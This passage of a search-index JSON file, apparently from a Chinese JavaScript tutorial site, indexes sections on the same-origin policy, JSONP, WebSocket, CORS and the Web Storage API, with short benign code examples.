};","title":"LocalStorage"},{"location":"bom/same-origin/#ajax","text":"\u540c\u6e90\u653f\u7b56\u89c4\u5b9a\uff0cAJAX \u8bf7\u6c42\u53ea\u80fd\u53d1\u7ed9\u540c\u6e90\u7684\u7f51\u5740\uff0c\u5426\u5219\u5c31\u62a5\u9519\u3002 \u9664\u4e86\u67b6\u8bbe\u670d\u52a1\u5668\u4ee3\u7406\uff08\u6d4f\u89c8\u5668\u8bf7\u6c42\u540c\u6e90\u670d\u52a1\u5668\uff0c\u518d\u7531\u540e\u8005\u8bf7\u6c42\u5916\u90e8\u670d\u52a1\uff09\uff0c\u6709\u4e09\u79cd\u65b9\u6cd5\u89c4\u907f\u8fd9\u4e2a\u9650\u5236\u3002 JSONP WebSocket CORS","title":"AJAX"},{"location":"bom/same-origin/#jsonp","text":"JSONP \u662f\u670d\u52a1\u5668\u4e0e\u5ba2\u6237\u7aef\u8de8\u6e90\u901a\u4fe1\u7684\u5e38\u7528\u65b9\u6cd5\u3002\u6700\u5927\u7279\u70b9\u5c31\u662f\u7b80\u5355\u6613\u7528\uff0c\u6ca1\u6709\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u8001\u5f0f\u6d4f\u89c8\u5668\u5168\u90e8\u652f\u6301\uff0c\u670d\u52a1\u7aef\u6539\u9020\u975e\u5e38\u5c0f\u3002 \u5b83\u7684\u505a\u6cd5\u5982\u4e0b\u3002 \u7b2c\u4e00\u6b65\uff0c\u7f51\u9875\u6dfb\u52a0\u4e00\u4e2a <script> \u5143\u7d20\uff0c\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u4e00\u4e2a\u811a\u672c\uff0c\u8fd9\u4e0d\u53d7\u540c\u6e90\u653f\u7b56\u9650\u5236\uff0c\u53ef\u4ee5\u8de8\u57df\u8bf7\u6c42\u3002 1 < script src = \"http://api.foo.com?callback=bar\" ></ script > \u6ce8\u610f\uff0c\u8bf7\u6c42\u7684\u811a\u672c\u7f51\u5740\u6709\u4e00\u4e2a callback \u53c2\u6570\uff08 ?callback=bar \uff09\uff0c\u7528\u6765\u544a\u8bc9\u670d\u52a1\u5668\uff0c\u5ba2\u6237\u7aef\u7684\u56de\u8c03\u51fd\u6570\u540d\u79f0\uff08 bar \uff09\u3002 \u7b2c\u4e8c\u6b65\uff0c\u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u62fc\u63a5\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5c06 JSON \u6570\u636e\u653e\u5728\u51fd\u6570\u540d\u91cc\u9762\uff0c\u4f5c\u4e3a\u5b57\u7b26\u4e32\u8fd4\u56de\uff08 bar({...}) \uff09\u3002 \u7b2c\u4e09\u6b65\uff0c\u5ba2\u6237\u7aef\u4f1a\u5c06\u670d\u52a1\u5668\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\uff0c\u4f5c\u4e3a\u4ee3\u7801\u89e3\u6790\uff0c\u56e0\u4e3a\u6d4f\u89c8\u5668\u8ba4\u4e3a\uff0c\u8fd9\u662f <script> \u6807\u7b7e\u8bf7\u6c42\u7684\u811a\u672c\u5185\u5bb9\u3002\u8fd9\u65f6\uff0c\u5ba2\u6237\u7aef\u53ea\u8981\u5b9a\u4e49\u4e86 bar() \u51fd\u6570\uff0c\u5c31\u80fd\u5728\u8be5\u51fd\u6570\u4f53\u5185\uff0c\u62ff\u5230\u670d\u52a1\u5668\u8fd4\u56de\u7684 JSON \u6570\u636e\u3002 \u4e0b\u9762\u770b\u4e00\u4e2a\u5b9e\u4f8b\u3002\u9996\u5148\uff0c\u7f51\u9875\u52a8\u6001\u63d2\u5165 <script> \u5143\u7d20\uff0c\u7531\u5b83\u5411\u8de8\u57df\u7f51\u5740\u53d1\u51fa\u8bf7\u6c42\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 function addScriptTag ( src ) { var script = document . createElement ( 'script' ); script . setAttribute ( 'type' , 'text/javascript' ); script . src = src ; document . body . appendChild ( script ); } window . onload = function () { addScriptTag ( 'http://example.com/ip?callback=foo' ); } function foo ( data ) { console . log ( 'Your public IP address is: ' + data . ip ); }; \u4e0a\u9762\u4ee3\u7801\u901a\u8fc7\u52a8\u6001\u6dfb\u52a0 <script> \u5143\u7d20\uff0c\u5411\u670d\u52a1\u5668 example.com \u53d1\u51fa\u8bf7\u6c42\u3002\u6ce8\u610f\uff0c\u8be5\u8bf7\u6c42\u7684\u67e5\u8be2\u5b57\u7b26\u4e32\u6709\u4e00\u4e2a callback \u53c2\u6570\uff0c\u7528\u6765\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u7684\u540d\u5b57\uff0c\u8fd9\u5bf9\u4e8e JSONP \u662f\u5fc5\u9700\u7684\u3002 \u670d\u52a1\u5668\u6536\u5230\u8fd9\u4e2a\u8bf7\u6c42\u4ee5\u540e\uff0c\u4f1a\u5c06\u6570\u636e\u653e\u5728\u56de\u8c03\u51fd\u6570\u7684\u53c2\u6570\u4f4d\u7f6e\u8fd4\u56de\u3002 1 2 3 foo ({ 'ip' : '8.8.8.8' }); \u7531\u4e8e <script> \u5143\u7d20\u8bf7\u6c42\u7684\u811a\u672c\uff0c\u76f4\u63a5\u4f5c\u4e3a\u4ee3\u7801\u8fd0\u884c\u3002\u8fd9\u65f6\uff0c\u53ea\u8981\u6d4f\u89c8\u5668\u5b9a\u4e49\u4e86 foo \u51fd\u6570\uff0c\u8be5\u51fd\u6570\u5c31\u4f1a\u7acb\u5373\u8c03\u7528\u3002\u4f5c\u4e3a\u53c2\u6570\u7684 JSON \u6570\u636e\u88ab\u89c6\u4e3a JavaScript \u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u907f\u514d\u4e86\u4f7f\u7528 JSON.parse \u7684\u6b65\u9aa4\u3002","title":"JSONP"},{"location":"bom/same-origin/#websocket","text":"WebSocket \u662f\u4e00\u79cd\u901a\u4fe1\u534f\u8bae\uff0c\u4f7f\u7528 ws:// \uff08\u975e\u52a0\u5bc6\uff09\u548c wss:// \uff08\u52a0\u5bc6\uff09\u4f5c\u4e3a\u534f\u8bae\u524d\u7f00\u3002\u8be5\u534f\u8bae\u4e0d\u5b9e\u884c\u540c\u6e90\u653f\u7b56\uff0c\u53ea\u8981\u670d\u52a1\u5668\u652f\u6301\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u5b83\u8fdb\u884c\u8de8\u6e90\u901a\u4fe1\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6d4f\u89c8\u5668\u53d1\u51fa\u7684 WebSocket \u8bf7\u6c42\u7684\u5934\u4fe1\u606f\uff08\u6458\u81ea \u7ef4\u57fa\u767e\u79d1 \uff09\u3002 1 2 3 4 5 6 7 8 GET /chat HTTP / 1.1 Host : server.example.com Upgrade : websocket Connection : Upgrade Sec-WebSocket-Key : x3JJHMbDL1EzLkh9GBhXDw== Sec-WebSocket-Protocol : chat, superchat Sec-WebSocket-Version : 13 Origin : http://example.com \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6709\u4e00\u4e2a\u5b57\u6bb5\u662f Origin \uff0c\u8868\u793a\u8be5\u8bf7\u6c42\u7684\u8bf7\u6c42\u6e90\uff08origin\uff09\uff0c\u5373\u53d1\u81ea\u54ea\u4e2a\u57df\u540d\u3002 \u6b63\u662f\u56e0\u4e3a\u6709\u4e86 Origin \u8fd9\u4e2a\u5b57\u6bb5\uff0c\u6240\u4ee5 WebSocket \u624d\u6ca1\u6709\u5b9e\u884c\u540c\u6e90\u653f\u7b56\u3002\u56e0\u4e3a\u670d\u52a1\u5668\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u5b57\u6bb5\uff0c\u5224\u65ad\u662f\u5426\u8bb8\u53ef\u672c\u6b21\u901a\u4fe1\u3002\u5982\u679c\u8be5\u57df\u540d\u5728\u767d\u540d\u5355\u5185\uff0c\u670d\u52a1\u5668\u5c31\u4f1a\u505a\u51fa\u5982\u4e0b\u56de\u5e94\u3002 1 2 3 4 5 HTTP / 1.1 101 Switching Protocols Upgrade : websocket Connection : Upgrade Sec-WebSocket-Accept : HSmrc0sMlYUkAGmm5OPpG2HaGWk= Sec-WebSocket-Protocol : chat","title":"WebSocket"},{"location":"bom/same-origin/#cors","text":"CORS \u662f\u8de8\u6e90\u8d44\u6e90\u5206\u4eab\uff08Cross-Origin Resource Sharing\uff09\u7684\u7f29\u5199\u3002\u5b83\u662f W3C \u6807\u51c6\uff0c\u5c5e\u4e8e\u8de8\u6e90 AJAX \u8bf7\u6c42\u7684\u6839\u672c\u89e3\u51b3\u65b9\u6cd5\u3002\u76f8\u6bd4 JSONP \u53ea\u80fd\u53d1 GET \u8bf7\u6c42\uff0cCORS \u5141\u8bb8\u4efb\u4f55\u7c7b\u578b\u7684\u8bf7\u6c42\u3002 \u4e0b\u4e00\u7ae0\u5c06\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u5982\u4f55\u901a\u8fc7 CORS \u5b8c\u6210\u8de8\u6e90 AJAX \u8bf7\u6c42\u3002","title":"CORS"},{"location":"bom/same-origin/#_7","text":"Mozilla Developer Network, Window.postMessage Jakub Jankiewicz, Cross-Domain LocalStorage David Baron, setTimeout with a shorter delay : \u5229\u7528 window.postMessage \u53ef\u4ee5\u5b9e\u73b00\u6beb\u79d2\u89e6\u53d1\u56de\u8c03\u51fd\u6570","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"bom/storage/","text":"Storage \u63a5\u53e3 \u00b6 \u6982\u8ff0 \u00b6 Storage \u63a5\u53e3\u7528\u4e8e\u811a\u672c\u5728\u6d4f\u89c8\u5668\u4fdd\u5b58\u6570\u636e\u3002\u4e24\u4e2a\u5bf9\u8c61\u90e8\u7f72\u4e86\u8fd9\u4e2a\u63a5\u53e3\uff1a window.sessionStorage \u548c window.localStorage \u3002 sessionStorage \u4fdd\u5b58\u7684\u6570\u636e\u7528\u4e8e\u6d4f\u89c8\u5668\u7684\u4e00\u6b21\u4f1a\u8bdd\uff08session\uff09\uff0c\u5f53\u4f1a\u8bdd\u7ed3\u675f\uff08\u901a\u5e38\u662f\u7a97\u53e3\u5173\u95ed\uff09\uff0c\u6570\u636e\u88ab\u6e05\u7a7a\uff1b localStorage \u4fdd\u5b58\u7684\u6570\u636e\u957f\u671f\u5b58\u5728\uff0c\u4e0b\u4e00\u6b21\u8bbf\u95ee\u8be5\u7f51\u7ad9\u7684\u65f6\u5019\uff0c\u7f51\u9875\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u4ee5\u524d\u4fdd\u5b58\u7684\u6570\u636e\u3002\u9664\u4e86\u4fdd\u5b58\u671f\u9650\u7684\u957f\u77ed\u4e0d\u540c\uff0c\u8fd9\u4e24\u4e2a\u5bf9\u8c61\u7684\u5176\u4ed6\u65b9\u9762\u90fd\u4e00\u81f4\u3002 \u4fdd\u5b58\u7684\u6570\u636e\u90fd\u4ee5\u201c\u952e\u503c\u5bf9\u201d\u7684\u5f62\u5f0f\u5b58\u5728\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6bcf\u4e00\u9879\u6570\u636e\u90fd\u6709\u4e00\u4e2a\u952e\u540d\u548c\u5bf9\u5e94\u7684\u503c\u3002\u6240\u6709\u7684\u6570\u636e\u90fd\u662f\u4ee5\u6587\u672c\u683c\u5f0f\u4fdd\u5b58\u3002 \u8fd9\u4e2a\u63a5\u53e3\u5f88\u50cf Cookie \u7684\u5f3a\u5316\u7248\uff0c\u80fd\u591f\u4f7f\u7528\u5927\u5f97\u591a\u7684\u5b58\u50a8\u7a7a\u95f4\u3002\u76ee\u524d\uff0c\u6bcf\u4e2a\u57df\u540d\u7684\u5b58\u50a8\u4e0a\u9650\u89c6\u6d4f\u89c8\u5668\u800c\u5b9a\uff0cChrome \u662f 2.5MB\uff0cFirefox \u548c Opera \u662f 5MB\uff0cIE \u662f 10MB\u3002\u5176\u4e2d\uff0cFirefox \u7684\u5b58\u50a8\u7a7a\u95f4\u7531\u4e00\u7ea7\u57df\u540d\u51b3\u5b9a\uff0c\u800c\u5176\u4ed6\u6d4f\u89c8\u5668\u6ca1\u6709\u8fd9\u4e2a\u9650\u5236\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cFirefox \u4e2d\uff0c a.example.com \u548c b.example.com \u5171\u4eab 5MB \u7684\u5b58\u50a8\u7a7a\u95f4\u3002\u53e6\u5916\uff0c\u4e0e Cookie \u4e00\u6837\uff0c\u5b83\u4eec\u4e5f\u53d7\u540c\u57df\u9650\u5236\u3002\u67d0\u4e2a\u7f51\u9875\u5b58\u5165\u7684\u6570\u636e\uff0c\u53ea\u6709\u540c\u57df\u4e0b\u7684\u7f51\u9875\u624d\u80fd\u8bfb\u53d6\uff0c\u5982\u679c\u8de8\u57df\u64cd\u4f5c\u4f1a\u62a5\u9519\u3002 \u5c5e\u6027\u548c\u65b9\u6cd5 \u00b6 Storage \u63a5\u53e3\u53ea\u6709\u4e00\u4e2a\u5c5e\u6027\u3002 Storage.length \uff1a\u8fd4\u56de\u4fdd\u5b58\u7684\u6570\u636e\u9879\u4e2a\u6570\u3002 1 2 3 4 5 window . localStorage . setItem ( 'foo' , 'a' ); window . localStorage . setItem ( 'bar' , 'b' ); window . localStorage . setItem ( 'baz' , 'c' ); window . localStorage . length // 3 \u8be5\u63a5\u53e3\u63d0\u4f9b5\u4e2a\u65b9\u6cd5\u3002 Storage.setItem() \u00b6 Storage.setItem() \u65b9\u6cd5\u7528\u4e8e\u5b58\u5165\u6570\u636e\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u952e\u540d\uff0c\u7b2c\u4e8c\u4e2a\u662f\u4fdd\u5b58\u7684\u6570\u636e\u3002\u5982\u679c\u952e\u540d\u5df2\u7ecf\u5b58\u5728\uff0c\u8be5\u65b9\u6cd5\u4f1a\u66f4\u65b0\u5df2\u6709\u7684\u952e\u503c\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 2 window . sessionStorage . setItem ( 'key' , 'value' ); window . localStorage . setItem ( 'key' , 'value' ); \u6ce8\u610f\uff0c Storage.setItem() \u4e24\u4e2a\u53c2\u6570\u90fd\u662f\u5b57\u7b26\u4e32\u3002\u5982\u679c\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u4f1a\u81ea\u52a8\u8f6c\u6210\u5b57\u7b26\u4e32\uff0c\u518d\u5b58\u5165\u6d4f\u89c8\u5668\u3002 1 2 window . sessionStorage . setItem ( 3 , { foo : 1 }); window . sessionStorage . getItem ( '3' ) // \"[object Object]\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c setItem \u65b9\u6cd5\u7684\u4e24\u4e2a\u53c2\u6570\u90fd\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u4f46\u662f\u5b58\u5165\u7684\u503c\u90fd\u662f\u5b57\u7b26\u4e32\u3002 \u5982\u679c\u50a8\u5b58\u7a7a\u95f4\u5df2\u6ee1\uff0c\u8be5\u65b9\u6cd5\u4f1a\u629b\u9519\u3002 \u5199\u5165\u4e0d\u4e00\u5b9a\u8981\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u76f4\u63a5\u8d4b\u503c\u4e5f\u662f\u53ef\u4ee5\u7684\u3002 1 2 3 4 // \u4e0b\u9762\u4e09\u79cd\u5199\u6cd5\u7b49\u4ef7 window . localStorage . foo = '123' ; window . localStorage [ 'foo' ] = '123' ; window . localStorage . setItem ( 'foo' , '123' ); Storage.getItem() \u00b6 Storage.getItem() \u65b9\u6cd5\u7528\u4e8e\u8bfb\u53d6\u6570\u636e\u3002\u5b83\u53ea\u6709\u4e00\u4e2a\u53c2\u6570\uff0c\u5c31\u662f\u952e\u540d\u3002\u5982\u679c\u952e\u540d\u4e0d\u5b58\u5728\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de null \u3002 1 2 window . sessionStorage . getItem ( 'key' ) window . localStorage . getItem ( 'key' ) \u952e\u540d\u5e94\u8be5\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5426\u5219\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 Storage.removeItem() \u00b6 Storage.removeItem() \u65b9\u6cd5\u7528\u4e8e\u6e05\u9664\u67d0\u4e2a\u952e\u540d\u5bf9\u5e94\u7684\u952e\u503c\u3002\u5b83\u63a5\u53d7\u952e\u540d\u4f5c\u4e3a\u53c2\u6570\uff0c\u5982\u679c\u952e\u540d\u4e0d\u5b58\u5728\uff0c\u8be5\u65b9\u6cd5\u4e0d\u4f1a\u505a\u4efb\u4f55\u4e8b\u60c5\u3002 1 2 sessionStorage . removeItem ( 'key' ); localStorage . removeItem ( 'key' ); Storage.clear() \u00b6 Storage.clear() \u65b9\u6cd5\u7528\u4e8e\u6e05\u9664\u6240\u6709\u4fdd\u5b58\u7684\u6570\u636e\u3002\u8be5\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u662f undefined \u3002 1 2 window . sessionStorage . clear () window . localStorage . clear () Storage.key() \u00b6 Storage.key() \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u4f5c\u4e3a\u53c2\u6570\uff08\u4ece\u96f6\u5f00\u59cb\uff09\uff0c\u8fd4\u56de\u8be5\u4f4d\u7f6e\u5bf9\u5e94\u7684\u952e\u540d\u3002 1 2 window . sessionStorage . setItem ( 'key' , 'value' ); window . sessionStorage . key ( 0 ) // \"key\" \u7ed3\u5408\u4f7f\u7528 Storage.length \u5c5e\u6027\u548c Storage.key() \u65b9\u6cd5\uff0c\u53ef\u4ee5\u904d\u5386\u6240\u6709\u7684\u952e\u3002 1 2 3 for ( var i = 0 ; i < window . localStorage . length ; i ++ ) { console . log ( localStorage . key ( i )); } storage \u4e8b\u4ef6 \u00b6 Storage \u63a5\u53e3\u50a8\u5b58\u7684\u6570\u636e\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u4f1a\u89e6\u53d1 storage \u4e8b\u4ef6\uff0c\u53ef\u4ee5\u6307\u5b9a\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 1 window . addEventListener ( 'storage' , onStorageChange ); \u76d1\u542c\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a event \u5b9e\u4f8b\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u3002\u8fd9\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u7ee7\u627f\u4e86 StorageEvent \u63a5\u53e3\uff0c\u6709\u51e0\u4e2a\u7279\u6709\u7684\u5c5e\u6027\uff0c\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\u3002 StorageEvent.key \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u53d1\u751f\u53d8\u52a8\u7684\u952e\u540d\u3002\u5982\u679c storage \u4e8b\u4ef6\u662f\u7531 clear() \u65b9\u6cd5\u5f15\u8d77\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 StorageEvent.newValue \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u65b0\u7684\u952e\u503c\u3002\u5982\u679c storage \u4e8b\u4ef6\u662f\u7531 clear() \u65b9\u6cd5\u6216\u5220\u9664\u8be5\u952e\u503c\u5bf9\u5f15\u53d1\u7684\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 StorageEvent.oldValue \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u65e7\u7684\u952e\u503c\u3002\u5982\u679c\u8be5\u952e\u503c\u5bf9\u662f\u65b0\u589e\u7684\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 StorageEvent.storageArea \uff1a\u5bf9\u8c61\uff0c\u8fd4\u56de\u952e\u503c\u5bf9\u6240\u5728\u7684\u6574\u4e2a\u5bf9\u8c61\u3002\u4e5f\u8bf4\u662f\u8bf4\uff0c\u53ef\u4ee5\u4ece\u8fd9\u4e2a\u5c5e\u6027\u4e0a\u9762\u62ff\u5230\u5f53\u524d\u57df\u540d\u50a8\u5b58\u7684\u6240\u6709\u952e\u503c\u5bf9\u3002 StorageEvent.url \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u539f\u59cb\u89e6\u53d1 storage \u4e8b\u4ef6\u7684\u90a3\u4e2a\u7f51\u9875\u7684\u7f51\u5740\u3002 \u4e0b\u9762\u662f StorageEvent.key \u5c5e\u6027\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 function onStorageChange ( e ) { console . log ( e . key ); } window . addEventListener ( 'storage' , onStorageChange ); \u6ce8\u610f\uff0c\u8be5\u4e8b\u4ef6\u6709\u4e00\u4e2a\u5f88\u7279\u522b\u7684\u5730\u65b9\uff0c\u5c31\u662f\u5b83\u4e0d\u5728\u5bfc\u81f4\u6570\u636e\u53d8\u5316\u7684\u5f53\u524d\u9875\u9762\u89e6\u53d1\uff0c\u800c\u662f\u5728\u540c\u4e00\u4e2a\u57df\u540d\u7684\u5176\u4ed6\u7a97\u53e3\u89e6\u53d1\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6d4f\u89c8\u5668\u53ea\u6253\u5f00\u4e00\u4e2a\u7a97\u53e3\uff0c\u53ef\u80fd\u89c2\u5bdf\u4e0d\u5230\u8fd9\u4e2a\u4e8b\u4ef6\u3002\u6bd4\u5982\u540c\u65f6\u6253\u5f00\u591a\u4e2a\u7a97\u53e3\uff0c\u5f53\u5176\u4e2d\u7684\u4e00\u4e2a\u7a97\u53e3\u5bfc\u81f4\u50a8\u5b58\u7684\u6570\u636e\u53d1\u751f\u6539\u53d8\u65f6\uff0c\u53ea\u6709\u5728\u5176\u4ed6\u7a97\u53e3\u624d\u80fd\u89c2\u5bdf\u5230\u76d1\u542c\u51fd\u6570\u7684\u6267\u884c\u3002\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u673a\u5236\uff0c\u5b9e\u73b0\u591a\u4e2a\u7a97\u53e3\u4e4b\u95f4\u7684\u901a\u4fe1\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Ryan Stewart\uff0c Introducing the HTML5 storage APIs Getting Started with LocalStorage Feross Aboukhadijeh, Introducing the HTML5 Hard Disk Filler\u2122 API Ben Summers, Inter-window messaging using localStorage Stack Overflow, Why does Internet Explorer fire the window \u201cstorage\u201d event on the window that stored the data? Stack Overflow, localStorage eventListener is not called","title":"Storage \u63a5\u53e3"},{"location":"bom/storage/#storage","text":"","title":"Storage \u63a5\u53e3"},{"location":"bom/storage/#_1","text":"Storage \u63a5\u53e3\u7528\u4e8e\u811a\u672c\u5728\u6d4f\u89c8\u5668\u4fdd\u5b58\u6570\u636e\u3002\u4e24\u4e2a\u5bf9\u8c61\u90e8\u7f72\u4e86\u8fd9\u4e2a\u63a5\u53e3\uff1a window.sessionStorage \u548c window.localStorage \u3002 sessionStorage \u4fdd\u5b58\u7684\u6570\u636e\u7528\u4e8e\u6d4f\u89c8\u5668\u7684\u4e00\u6b21\u4f1a\u8bdd\uff08session\uff09\uff0c\u5f53\u4f1a\u8bdd\u7ed3\u675f\uff08\u901a\u5e38\u662f\u7a97\u53e3\u5173\u95ed\uff09\uff0c\u6570\u636e\u88ab\u6e05\u7a7a\uff1b localStorage \u4fdd\u5b58\u7684\u6570\u636e\u957f\u671f\u5b58\u5728\uff0c\u4e0b\u4e00\u6b21\u8bbf\u95ee\u8be5\u7f51\u7ad9\u7684\u65f6\u5019\uff0c\u7f51\u9875\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u4ee5\u524d\u4fdd\u5b58\u7684\u6570\u636e\u3002\u9664\u4e86\u4fdd\u5b58\u671f\u9650\u7684\u957f\u77ed\u4e0d\u540c\uff0c\u8fd9\u4e24\u4e2a\u5bf9\u8c61\u7684\u5176\u4ed6\u65b9\u9762\u90fd\u4e00\u81f4\u3002 \u4fdd\u5b58\u7684\u6570\u636e\u90fd\u4ee5\u201c\u952e\u503c\u5bf9\u201d\u7684\u5f62\u5f0f\u5b58\u5728\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6bcf\u4e00\u9879\u6570\u636e\u90fd\u6709\u4e00\u4e2a\u952e\u540d\u548c\u5bf9\u5e94\u7684\u503c\u3002\u6240\u6709\u7684\u6570\u636e\u90fd\u662f\u4ee5\u6587\u672c\u683c\u5f0f\u4fdd\u5b58\u3002 \u8fd9\u4e2a\u63a5\u53e3\u5f88\u50cf Cookie \u7684\u5f3a\u5316\u7248\uff0c\u80fd\u591f\u4f7f\u7528\u5927\u5f97\u591a\u7684\u5b58\u50a8\u7a7a\u95f4\u3002\u76ee\u524d\uff0c\u6bcf\u4e2a\u57df\u540d\u7684\u5b58\u50a8\u4e0a\u9650\u89c6\u6d4f\u89c8\u5668\u800c\u5b9a\uff0cChrome \u662f 2.5MB\uff0cFirefox \u548c Opera \u662f 5MB\uff0cIE \u662f 10MB\u3002\u5176\u4e2d\uff0cFirefox \u7684\u5b58\u50a8\u7a7a\u95f4\u7531\u4e00\u7ea7\u57df\u540d\u51b3\u5b9a\uff0c\u800c\u5176\u4ed6\u6d4f\u89c8\u5668\u6ca1\u6709\u8fd9\u4e2a\u9650\u5236\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cFirefox \u4e2d\uff0c a.example.com \u548c b.example.com \u5171\u4eab 5MB \u7684\u5b58\u50a8\u7a7a\u95f4\u3002\u53e6\u5916\uff0c\u4e0e Cookie \u4e00\u6837\uff0c\u5b83\u4eec\u4e5f\u53d7\u540c\u57df\u9650\u5236\u3002\u67d0\u4e2a\u7f51\u9875\u5b58\u5165\u7684\u6570\u636e\uff0c\u53ea\u6709\u540c\u57df\u4e0b\u7684\u7f51\u9875\u624d\u80fd\u8bfb\u53d6\uff0c\u5982\u679c\u8de8\u57df\u64cd\u4f5c\u4f1a\u62a5\u9519\u3002","title":"\u6982\u8ff0"},{"location":"bom/storage/#_2","text":"Storage \u63a5\u53e3\u53ea\u6709\u4e00\u4e2a\u5c5e\u6027\u3002 Storage.length \uff1a\u8fd4\u56de\u4fdd\u5b58\u7684\u6570\u636e\u9879\u4e2a\u6570\u3002 1 2 3 4 5 window . localStorage . setItem ( 'foo' , 'a' ); window . localStorage . setItem ( 'bar' , 'b' ); window . localStorage . setItem ( 'baz' , 'c' ); window . localStorage . length // 3 \u8be5\u63a5\u53e3\u63d0\u4f9b5\u4e2a\u65b9\u6cd5\u3002","title":"\u5c5e\u6027\u548c\u65b9\u6cd5"},{"location":"bom/storage/#storagesetitem","text":"Storage.setItem() \u65b9\u6cd5\u7528\u4e8e\u5b58\u5165\u6570\u636e\u3002\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u952e\u540d\uff0c\u7b2c\u4e8c\u4e2a\u662f\u4fdd\u5b58\u7684\u6570\u636e\u3002\u5982\u679c\u952e\u540d\u5df2\u7ecf\u5b58\u5728\uff0c\u8be5\u65b9\u6cd5\u4f1a\u66f4\u65b0\u5df2\u6709\u7684\u952e\u503c\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 2 window . sessionStorage . setItem ( 'key' , 'value' ); window . localStorage . setItem ( 'key' , 'value' ); \u6ce8\u610f\uff0c Storage.setItem() \u4e24\u4e2a\u53c2\u6570\u90fd\u662f\u5b57\u7b26\u4e32\u3002\u5982\u679c\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u4f1a\u81ea\u52a8\u8f6c\u6210\u5b57\u7b26\u4e32\uff0c\u518d\u5b58\u5165\u6d4f\u89c8\u5668\u3002 1 2 window . sessionStorage . setItem ( 3 , { foo : 1 }); window . sessionStorage . getItem ( '3' ) // \"[object Object]\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c setItem \u65b9\u6cd5\u7684\u4e24\u4e2a\u53c2\u6570\u90fd\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u4f46\u662f\u5b58\u5165\u7684\u503c\u90fd\u662f\u5b57\u7b26\u4e32\u3002 \u5982\u679c\u50a8\u5b58\u7a7a\u95f4\u5df2\u6ee1\uff0c\u8be5\u65b9\u6cd5\u4f1a\u629b\u9519\u3002 \u5199\u5165\u4e0d\u4e00\u5b9a\u8981\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u76f4\u63a5\u8d4b\u503c\u4e5f\u662f\u53ef\u4ee5\u7684\u3002 1 2 3 4 // \u4e0b\u9762\u4e09\u79cd\u5199\u6cd5\u7b49\u4ef7 window . localStorage . foo = '123' ; window . localStorage [ 'foo' ] = '123' ; window . localStorage . setItem ( 'foo' , '123' );","title":"Storage.setItem()"},{"location":"bom/storage/#storagegetitem","text":"Storage.getItem() \u65b9\u6cd5\u7528\u4e8e\u8bfb\u53d6\u6570\u636e\u3002\u5b83\u53ea\u6709\u4e00\u4e2a\u53c2\u6570\uff0c\u5c31\u662f\u952e\u540d\u3002\u5982\u679c\u952e\u540d\u4e0d\u5b58\u5728\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de null \u3002 1 2 window . sessionStorage . getItem ( 'key' ) window . localStorage . getItem ( 'key' ) \u952e\u540d\u5e94\u8be5\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5426\u5219\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002","title":"Storage.getItem()"},{"location":"bom/storage/#storageremoveitem","text":"Storage.removeItem() 